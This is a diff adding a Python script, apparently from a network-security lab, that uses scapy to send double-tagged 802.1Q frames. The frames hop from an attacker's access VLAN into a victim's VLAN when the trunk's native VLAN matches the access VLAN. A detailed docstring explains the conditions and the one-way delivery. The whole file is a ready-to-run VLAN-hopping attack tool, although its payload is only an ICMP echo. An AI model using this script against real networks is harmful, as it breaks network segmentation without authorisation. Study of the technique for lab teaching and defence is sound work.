@@ -1,0 +1,67 @@
+#!/usr/bin/env python3
+"""vlan-double-tag - send a double-tagged (802.1Q-in-802.1Q) frame that hops VLANs.
+
+Usage: vlan-double-tag <iface> <outer-vlan> <inner-vlan> <target-ip> [count]
+
+    iface        the attacker's NIC on the access switch (e.g. 103-S1)
+    outer-vlan   the OUTER tag. It must equal the trunk's native VLAN, which here
+                 equals the attacker's own access VLAN (10). The access switch
+                 accepts the frame as that VLAN and, because the native VLAN
+                 egresses the trunk untagged, strips this one tag on the way out.
+    inner-vlan   the INNER tag, the VLAN you are hopping INTO (the victim's, 20).
+                 It survives the strip and is delivered on the far switch.
+    target-ip    the victim's address, written into the inner IP header.
+    count        frames to send; 0 = until Ctrl-C (default 5).
+
+Nothing here is a magic button: you name the outer VLAN, the inner VLAN, and the
+target every time, so hopping means knowing that the native VLAN equals your access
+VLAN. The frame is one-way. The destination MAC is broadcast, so no cross-VLAN ARP
+is needed and every host in the inner VLAN receives it; the victim processes it
+because the inner IP destination is its own address. Its reply, if any, stays in
+the inner VLAN and never returns to you: a double-tagged hop cannot carry a
+conversation, only a one-way delivery.
+"""
+import sys
+
+from scapy.all import Ether, Dot1Q, IP, ICMP, sendp, get_if_addr, conf
+
+conf.verb = 0
+
+
+def main():
+    if not (5 <= len(sys.argv) <= 6):
+        sys.exit(__doc__)
+    iface = sys.argv[1]
+    outer = int(sys.argv[2])
+    inner = int(sys.argv[3])
+    target = sys.argv[4]
+    count = int(sys.argv[5]) if len(sys.argv) == 6 else 5
+
+    # Broadcast at L2 so no cross-VLAN ARP is needed; the two stacked tags carry it
+    # over the trunk; the inner IP header addresses the victim inside the far VLAN.
+    # The inner source is the attacker's own VLAN 10 address, so the victim's
+    # capture shows a VLAN 10 address turning up inside VLAN 20: the hop, on the wire.
+    frame = (Ether(dst="ff:ff:ff:ff:ff:ff") /
+             Dot1Q(vlan=outer) /
+             Dot1Q(vlan=inner) /
+             IP(src=get_if_addr(iface), dst=target) /
+             ICMP())
+
+    reqlen = len(bytes(frame))
+    forever = (count == 0)
+    print(f"[*] double-tagged frame -> {target}: outer VLAN {outer}, inner VLAN {inner} "
+          f"({reqlen} bytes on the wire, {'until Ctrl-C' if forever else f'{count}x'})")
+    print(f"    outer {outer} is stripped on the trunk's native-VLAN egress; "
+          f"inner {inner} is delivered on the far switch")
+    try:
+        if forever:
+            sendp(frame, iface=iface, loop=1, inter=0.2)
+        else:
+            sendp(frame, iface=iface, count=count, inter=0.2)
+    except KeyboardInterrupt:
+        pass
+    print("[*] done")
+
+
+if __name__ == "__main__":
+    main()
